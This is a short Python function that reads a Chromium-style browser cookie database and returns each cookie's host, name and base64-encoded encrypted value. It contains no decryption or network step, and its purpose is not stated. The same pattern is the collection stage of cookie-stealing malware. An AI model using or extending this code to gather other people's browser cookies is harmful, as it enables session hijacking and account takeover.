import sqlite3, base64
from pathlib import Path

def extract_cookies(db_path):
    if not Path(db_path).exists():
        return []

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    cookies = []

    for host, name, val in cursor.fetchall():
        cookies.append({
            "host": host,
            "name": name,
            "value_enc": base64.b64encode(val).decode()
        })

    conn.close()
    return cookies
